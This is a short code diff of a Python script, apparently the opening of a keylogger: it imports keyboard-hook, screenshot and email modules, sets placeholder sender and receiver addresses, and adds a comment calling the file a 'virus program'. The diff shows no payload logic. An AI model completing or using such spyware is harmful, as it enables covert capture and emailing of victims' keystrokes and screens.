@@ -1,4 +1,6 @@
 # -*- coding: utf-8 -*- #
+# virus program itself
+
 import os
 import time
 import pythoncom
@@ -7,7 +9,6 @@ import pyHook
 from PIL import ImageGrab
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
-
 
 sender = 'XXXXXXXXXXx@XXX.com'
 receiver = 'XXXXXXXXXX@XXX.com'
